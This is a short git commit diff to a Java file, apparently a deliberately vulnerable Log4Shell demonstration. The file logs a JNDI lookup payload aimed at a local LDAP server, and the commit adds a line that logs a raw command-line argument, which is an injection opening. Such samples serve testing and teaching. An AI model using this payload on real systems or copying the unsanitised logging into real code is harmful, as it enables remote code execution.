f1ead464b133b17ba678b3334f609809cfa346c8
Mathew Payne <2772944+GeekMasher@users.noreply.github.com>
2022-03-24 15:16:05 +0000

    Update log4j.java

--- src/main/java/log4j.java
+++ src/main/java/log4j.java
@@ -7,5 +7,8 @@ public class log4j {
 
     public static void main(String[] args) {
         logger.error("${jndi:ldap://127.0.0.1:1389/a}");
+        
+        logger.error("Log4Shell? Never heard of it but I do know I need to log this....");
+        logger.error(args[0]);
     }
 }
